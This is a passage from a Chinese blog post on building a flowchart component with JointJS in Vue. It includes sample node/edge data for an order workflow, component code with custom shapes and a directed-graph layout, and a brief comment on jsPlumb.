href="https://github.com/clientIO/joint" target="_blank" rel="noopener">https://github.com/clientIO/joint</a><br>效果图<br><img src="/study/2018/8/procedure/jointjs.png"></p><p>可以通过<code>npm install jointjs -save</code>安装</p><p>参照了很多demo和文档，用的是矩形，但是可以设置圆角的度数变成椭圆形，其他形状我就无力了。</p><p>可以自定义矩形的样式和矩形框里面的文字样式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//data.vue</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        <span class="keyword">var</span> userClass = &#123;<span class="comment">//这个要参照SVG属性</span></span><br><span class="line">            <span class="comment">/**shapeStyle</span></span><br><span class="line"><span class="comment">             * fill:填充的背景颜色</span></span><br><span class="line"><span class="comment">                stroke: 边框颜色</span></span><br><span class="line"><span class="comment">                strokeWidth: 边框宽度</span></span><br><span class="line"><span class="comment">                rx: 圆角</span></span><br><span class="line"><span class="comment">                ry: </span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            shapeStyle:&#123;<span class="comment">//矩形样式</span></span><br><span class="line">                fill:&#123;</span><br><span class="line">                    type: <span class="string">'linearGradient'</span>,</span><br><span class="line">                    stops: [</span><br><span class="line">                        &#123;<span class="attr">offset</span>: <span class="string">'0%'</span>, <span class="attr">color</span>: <span class="string">'#98FB98'</span>&#125;,</span><br><span class="line">                        &#123;<span class="attr">offset</span>: <span class="string">'100%'</span>, <span class="attr">color</span>: <span class="string">'#9ACD32'</span>&#125;</span><br><span class="line">                    ],</span><br><span class="line">                &#125;,</span><br><span class="line">                rx:<span class="number">150</span>,</span><br><span class="line">                ry:<span class="number">15</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * textStyle</span></span><br><span class="line"><span class="comment">             *  fontWeight</span></span><br><span class="line"><span class="comment">             *  fontSize</span></span><br><span class="line"><span class="comment">             * </span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            textStyle:&#123;<span class="comment">//文本样式</span></span><br><span class="line">                fontWeight:<span class="string">'bold'</span></span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span>&#123;</span><br><span class="line">            graphData :&#123;</span><br><span class="line">                node:&#123;</span><br><span class="line">                    <span class="string">'100'</span>:&#123;<span class="attr">text</span>:<span class="string">'用户提交资料'</span>,<span class="attr">category</span>:userClass&#125;,</span><br><span class="line">                    <span class="string">'101'</span>:&#123;<span class="attr">text</span>:<span class="string">'用户完善资料'</span>,<span class="attr">category</span>:userClass&#125;,</span><br><span class="line">                    <span class="string">'102'</span>:&#123;<span class="attr">text</span>:<span class="string">'用户确认完成'</span>,<span class="attr">category</span>:userClass&#125;,</span><br><span class="line">                    <span class="string">'103'</span>:&#123;<span class="attr">text</span>:<span class="string">'用户撤销'</span>,<span class="attr">category</span>:userClass&#125;,</span><br><span class="line"></span><br><span class="line">                    <span class="string">'200'</span>:&#123;<span class="attr">text</span>:<span class="string">'供应商驳回'</span>&#125;,</span><br><span class="line">                    <span class="string">'201'</span>:&#123;<span class="attr">text</span>:<span class="string">'供应商接单'</span>&#125;,</span><br><span class="line">                    <span class="string">'202'</span>:&#123;<span class="attr">text</span>:<span class="string">'供应商完工'</span>&#125;,</span><br><span class="line">                    <span class="string">'203'</span>:&#123;<span class="attr">text</span>:<span class="string">'等待供应商处理'</span>&#125;,</span><br><span class="line"></span><br><span class="line">                    <span class="string">'300'</span>:&#123;<span class="attr">text</span>:<span class="string">'系统交付出错'</span>&#125;               </span><br><span class="line">                &#125;,</span><br><span class="line">                edge :&#123;<span class="comment">//每个点都要写</span></span><br><span class="line">                    <span class="string">'100'</span>: [<span class="string">'200'</span>,<span class="string">'201'</span>,<span class="string">'103'</span>], </span><br><span class="line">                    <span class="string">'101'</span>: [<span class="string">'201'</span>],</span><br><span class="line">                    <span class="string">'102'</span>:[],</span><br><span class="line">                    <span class="string">'103'</span>: [<span class="string">'100'</span>],</span><br><span class="line"></span><br><span class="line">                    <span class="string">'200'</span>: [<span class="string">'101'</span>],              </span><br><span class="line">                    <span class="string">'201'</span>: [<span class="string">'202'</span>,<span class="string">'300'</span>],</span><br><span class="line">                    <span class="string">'202'</span>: [<span class="string">'102'</span>],               </span><br><span class="line">                    <span class="string">'203'</span>: [<span class="string">'102'</span>], </span><br><span class="line"></span><br><span class="line">                    <span class="string">'300'</span>: [<span class="string">'203'</span>],</span><br><span class="line">                </span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"background-color:#EEEEEE;margin:0;padding:5px;font-size:0.9em"</span>&gt;</span></span><br><span class="line">    您当前处于 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tip"</span>&gt;</span>用户提交资料<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 步骤 </span><br><span class="line">    下一步等待<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"tip"</span>&gt;</span>供应商接单<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-if</span>=<span class="string">"show===false"</span> @<span class="attr">click</span>=<span class="string">"show=true"</span>&gt;</span>展开<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-else</span> @<span class="attr">click</span>=<span class="string">"show=false"</span>&gt;</span>收起<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"myholder"</span> <span class="attr">v-show</span>=<span class="string">"show"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.joint=<span class="built_in">require</span>(<span class="string">'jointjs'</span>);</span><br><span class="line"><span class="keyword">var</span> Shape = joint.dia.Element.define(<span class="string">'default.Rectangle'</span>, &#123;      </span><br><span class="line">        attrs: &#123;  </span><br><span class="line">            rect: &#123;</span><br><span class="line">                refWidth: <span class="string">'100%'</span>,</span><br><span class="line">                refHeight: <span class="string">'100%'</span>,</span><br><span class="line">                <span class="comment">//下面这些可以自己设置</span></span><br><span class="line">                fill:&#123;</span><br><span class="line">                    type: <span class="string">'linearGradient'</span>,</span><br><span class="line">                    stops: [</span><br><span class="line">                        &#123;<span class="attr">offset</span>: <span class="string">'0%'</span>, <span class="attr">color</span>: <span class="string">'#B0E0E6'</span>&#125;,<span class="comment">//渐变开始</span></span><br><span class="line">                        &#123;<span class="attr">offset</span>: <span class="string">'100%'</span>, <span class="attr">color</span>: <span class="string">'#F0F8FF'</span>&#125;<span class="comment">//渐变结束</span></span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                stroke: <span class="string">'#B0E0E6'</span>,</span><br><span class="line">                strokeWidth: <span class="number">1</span>,</span><br><span class="line">                rx: <span class="number">5</span>,<span class="comment">//圆角</span></span><br><span class="line">                ry: <span class="number">5</span></span><br><span class="line">            &#125;,</span><br><span class="line">            text: &#123;</span><br><span class="line">                refX: <span class="string">'50%'</span>,</span><br><span class="line">                refY: <span class="string">'50%'</span>,                               </span><br><span class="line">                textVerticalAnchor: <span class="string">'middle'</span>,</span><br><span class="line">                textAnchor: <span class="string">'middle'</span>,</span><br><span class="line">                fontSize: <span class="number">10</span>           </span><br><span class="line">            &#125;</span><br><span class="line">         &#125;                    </span><br><span class="line">    &#125;, </span><br><span class="line">    &#123;</span><br><span class="line">         markup: <span class="string">'&lt;rect/&gt;&lt;text/&gt;'</span>,</span><br><span class="line">         setText: <span class="function"><span class="keyword">function</span>(<span class="params">text</span>) </span>&#123;                    </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.attr(<span class="string">'text/text'</span>, text || <span class="string">''</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        setShapeStyle:<span class="function"><span class="keyword">function</span>(<span class="params">shapeStyle</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">let</span> newstyle = <span class="built_in">Object</span>.assign(&#123;&#125;,<span class="keyword">this</span>.attr(<span class="string">'rect'</span>),shapeStyle);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.attr(<span class="string">'rect'</span>,newstyle)</span><br><span class="line">        &#125;,</span><br><span class="line">        </span><br><span class="line">        setTextStyle:<span class="function"><span class="keyword">function</span>(<span class="params">textStyle</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">let</span> newstyle = <span class="built_in">Object</span>.assign(&#123;&#125;,<span class="keyword">this</span>.attr(<span class="string">'text'</span>),textStyle);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.attr(<span class="string">'text'</span>,newstyle)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Link = joint.dia.Link.define(<span class="string">'default.Link'</span>, &#123;</span><br><span class="line">        attrs: &#123;</span><br><span class="line">            <span class="string">'.connection'</span>: &#123;</span><br><span class="line">                stroke: <span class="string">'#2F4F4F'</span>,<span class="comment">//线</span></span><br><span class="line">                strokeWidth: <span class="number">1</span>,</span><br><span class="line">                pointerEvents: <span class="string">'none'</span>,</span><br><span class="line">                targetMarker: &#123;<span class="comment">//箭头</span></span><br><span class="line">                    type: <span class="string">'path'</span>,</span><br><span class="line">                    fill: <span class="string">'#2F4F4F'</span>,<span class="comment">//填充颜色</span></span><br><span class="line">                    stroke: <span class="string">'#2F4F4F'</span>,<span class="comment">//边框颜色</span></span><br><span class="line">                    strokeWidth:<span class="string">'1'</span>,</span><br><span class="line">                    d: <span class="string">'M 2 -2 0 0 2 2 z'</span><span class="comment">//形状</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        connector: &#123;</span><br><span class="line">            name: <span class="string">'rounded'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        z: <span class="number">-1</span>,</span><br><span class="line">        weight: <span class="number">1</span>,</span><br><span class="line">        minLen: <span class="number">1</span>,</span><br><span class="line">        labelPosition: <span class="string">'c'</span>,</span><br><span class="line">        labelOffset: <span class="number">10</span>,</span><br><span class="line">        labelSize: &#123;</span><br><span class="line">            width: <span class="number">50</span>,</span><br><span class="line">            height: <span class="number">30</span></span><br><span class="line">        &#125;,</span><br><span class="line">        labels: [&#123;</span><br><span class="line">            markup: <span class="string">'&lt;rect/&gt;&lt;text/&gt;'</span>,</span><br><span class="line">            attrs: &#123;</span><br><span class="line">                text: &#123;</span><br><span class="line">                    fill: <span class="string">'gray'</span>,</span><br><span class="line">                    textAnchor: <span class="string">'middle'</span>,</span><br><span class="line">                    refY: <span class="number">5</span>,</span><br><span class="line">                    refY2: <span class="string">'-50%'</span>,</span><br><span class="line">                    fontSize: <span class="number">10</span>,</span><br><span class="line">                    cursor: <span class="string">'pointer'</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">// rect: &#123;</span></span><br><span class="line">                <span class="comment">//     fill: 'lightgray',</span></span><br><span class="line">                <span class="comment">//     stroke: 'gray',</span></span><br><span class="line">                <span class="comment">//     strokeWidth: 2,</span></span><br><span class="line">                <span class="comment">//     refWidth: '100%',</span></span><br><span class="line">                <span class="comment">//     refHeight: '100%',</span></span><br><span class="line">                <span class="comment">//     refX: '-50%',</span></span><br><span class="line">                <span class="comment">//     refY: '-50%',</span></span><br><span class="line">                <span class="comment">//     rx: 5,</span></span><br><span class="line">                <span class="comment">//     ry: 5</span></span><br><span class="line">                <span class="comment">// &#125;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            size: &#123;</span><br><span class="line">                width: <span class="number">50</span>, <span class="attr">height</span>: <span class="number">10</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;]</span><br><span class="line"></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        markup: <span class="string">'&lt;path class="connection"/&gt;&lt;g class="labels"/&gt;'</span>,</span><br><span class="line">        </span><br><span class="line">        connect: <span class="function"><span class="keyword">function</span>(<span class="params">sourceId, targetId</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.set(&#123;</span><br><span class="line">                source: &#123; <span class="attr">id</span>: sourceId &#125;,</span><br><span class="line">                target: &#123; <span class="attr">id</span>: targetId &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        setLabelText: <span class="function"><span class="keyword">function</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.prop(<span class="string">'labels/0/attrs/text/text'</span>, text || <span class="string">''</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ElementView = joint.dia.ElementView.extend(&#123;</span><br><span class="line">        pointerdown: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// this._click = true;</span></span><br><span class="line">            <span class="comment">// joint.dia.ElementView.prototype.pointerdown.apply(this, arguments);</span></span><br><span class="line">        &#125;,</span><br><span class="line">        pointermove: <span class="function"><span class="keyword">function</span>(<span class="params">evt, x, y</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// this._click = false;</span></span><br><span class="line">            <span class="comment">// joint.dia.ElementView.prototype.pointermove.apply(this, arguments);</span></span><br><span class="line">        &#125;,</span><br><span class="line">        pointerup: <span class="function"><span class="keyword">function</span> (<span class="params">evt, x, y</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// if (this._click) &#123;</span></span><br><span class="line">            <span class="comment">//     // triggers an event on the paper and the element itself</span></span><br><span class="line">            <span class="comment">//     this.notify('cell:click', evt, x, y); </span></span><br><span class="line">            <span class="comment">// &#125; else &#123;</span></span><br><span class="line">            <span class="comment">//     joint.dia.ElementView.prototype.pointerup.apply(this, arguments);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="keyword">var</span> LinkView = joint.dia.LinkView.extend(&#123;</span><br><span class="line">    addVertex: <span class="function"><span class="keyword">function</span>(<span class="params">evt, x, y</span>) </span>&#123;&#125;,</span><br><span class="line">    removeVertex: <span class="function"><span class="keyword">function</span>(<span class="params">endType</span>) </span>&#123;&#125;,</span><br><span class="line">    pointerdown:<span class="function"><span class="keyword">function</span>(<span class="params">evt, x, y</span>) </span>&#123;&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;   </span><br><span class="line">    data()&#123;</span><br><span class="line">        <span class="keyword">return</span>&#123;</span><br><span class="line">            graph:<span class="literal">null</span>,</span><br><span class="line">            paper:<span class="literal">null</span>,</span><br><span class="line">            show:<span class="literal">true</span></span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;,</span><br><span class="line">    props:&#123;</span><br><span class="line">        graphData:&#123;</span><br><span class="line">            type:<span class="built_in">Object</span>,</span><br><span class="line">            required:<span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted()&#123;</span><br><span class="line">        <span class="keyword">let</span> w = <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>).width ; </span><br><span class="line">        <span class="keyword">this</span>.graph = <span class="keyword">new</span> joint.dia.Graph;</span><br><span class="line">        <span class="keyword">this</span>.paper = <span class="keyword">new</span> joint.dia.Paper(&#123;</span><br><span class="line">            el: <span class="built_in">document</span>.getElementById(<span class="string">'myholder'</span>),</span><br><span class="line">            width: w,</span><br><span class="line">            height: <span class="number">250</span>,         </span><br><span class="line">            model: <span class="keyword">this</span>.graph,</span><br><span class="line">            elementView: ElementView,<span class="comment">//禁止拖拽</span></span><br><span class="line">            linkView:LinkView<span class="comment">//禁止拖拽</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">this</span>.layout();</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        getWidthandHeight(label)&#123;</span><br><span class="line">            <span class="keyword">let</span> maxLineLength = _.max(label.split(<span class="string">'\n'</span>), <span class="function"><span class="keyword">function</span>(<span class="params">l</span>) </span>&#123; <span class="keyword">return</span> l.length; &#125;).length,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Compute width/height of the rectangle based on the number</span></span><br><span class="line">            <span class="comment">// of lines in the label and the letter size. 0.6 * letterSize is</span></span><br><span class="line">            <span class="comment">// an approximation of the monospace font letter width.</span></span><br><span class="line">             letterSize = <span class="number">8</span>,</span><br><span class="line">             width = <span class="number">2</span> * (letterSize * (<span class="number">0.6</span> * maxLineLength + <span class="number">1</span>)),</span><br><span class="line">             height = <span class="number">2</span> * ((label.split(<span class="string">'\n'</span>).length + <span class="number">1</span>) * letterSize);</span><br><span class="line">            <span class="keyword">return</span> &#123;width,height&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        getLayoutOptions() &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="comment">// setVertices: false,</span></span><br><span class="line">                <span class="comment">// setLabels: false,</span></span><br><span class="line">                <span class="comment">// ranker:'longer-path',//'tight-tree'/'network-simplex',</span></span><br><span class="line">                rankDir: <span class="string">'LR'</span>,</span><br><span class="line">                align: <span class="string">'UR'</span>,</span><br><span class="line">                rankSep:<span class="number">0</span>,</span><br><span class="line">                edgeSep:<span class="number">0</span>,</span><br><span class="line">                nodeSep:<span class="number">0</span>,</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;,</span><br><span class="line">        buildGraphFromAdjacencyList(adjacencyList) &#123;</span><br><span class="line">            <span class="keyword">let</span> elements = [],links = [],obj,size,node;</span><br><span class="line">            <span class="keyword">const</span> _this=<span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">const</span> map=<span class="keyword">this</span>.graphData.node;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">Object</span>.keys(adjacencyList).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">parentId</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// Add element</span></span><br><span class="line"></span><br><span class="line">                obj =map[parentId];</span><br><span class="line">                size = _this.getWidthandHeight(obj.text);</span><br><span class="line">                node =<span class="keyword">new</span> Shape(&#123;<span class="attr">id</span>:parentId,<span class="attr">size</span>:size&#125;).setText(obj.text);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(obj.category&amp;&amp;obj.category.shapeStyle)&#123;</span><br><span class="line">                    node = node.setShapeStyle(obj.category.shapeStyle);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(obj.category&amp;&amp;obj.category.textStyle)&#123;</span><br><span class="line">                    node = node.setTextStyle(obj.category.textStyle);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                elements.push(node);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// Add links</span></span><br><span class="line">                adjacencyList[parentId].forEach(<span class="function"><span class="keyword">function</span>(<span class="params">childId</span>) </span>&#123;</span><br><span class="line">                    links.push(</span><br><span class="line">                        <span class="keyword">new</span> Link().connect(parentId, childId)<span class="comment">// .setLabelText(parentLabel + '-' + childLabel)                                         </span></span><br><span class="line">                    );</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> elements.concat(links);</span><br><span class="line">        &#125;,</span><br><span class="line">        layout() &#123;            </span><br><span class="line">            <span class="keyword">let</span> cells = <span class="keyword">this</span>.buildGraphFromAdjacencyList(<span class="keyword">this</span>.graphData.edge);    </span><br><span class="line">            <span class="keyword">this</span>.graph.resetCells(cells);</span><br><span class="line">            joint.layout.DirectedGraph.layout(<span class="keyword">this</span>.graph, <span class="keyword">this</span>.getLayoutOptions());</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">#myholder &#123;</span></span><br><span class="line"><span class="regexp">    border: 1px solid lightgray;</span></span><br><span class="line"><span class="regexp">    margin-bottom:20px;</span></span><br><span class="line"><span class="regexp">    padding-left:20px</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">.tip&#123;</span></span><br><span class="line"><span class="regexp">  color:#9ACD32;</span></span><br><span class="line"><span class="regexp">  font-size:0.9em;</span></span><br><span class="line"><span class="regexp">  font-weight:bold;</span></span><br><span class="line"><span class="regexp">  padding:5px;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br></pre></td></tr></table></figure><p>这是我自己包装的代码地址：<a href="https://github.com/LRY1994/vue-lib/tree/master/src/components/process-joint" target="_blank" rel="noopener">https://github.com/LRY1994/vue-lib/tree/master/src/components/process-joint</a></p><p>这个目前看来还算满意</p><h3 id="jsplumb"><a href="#jsplumb" class="headerlink" title="jsplumb"></a>jsplumb</h3><p>这个看了官网，不太友好，而且下载只有一个js文件，没有demo代码，不知如何下手</p><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a 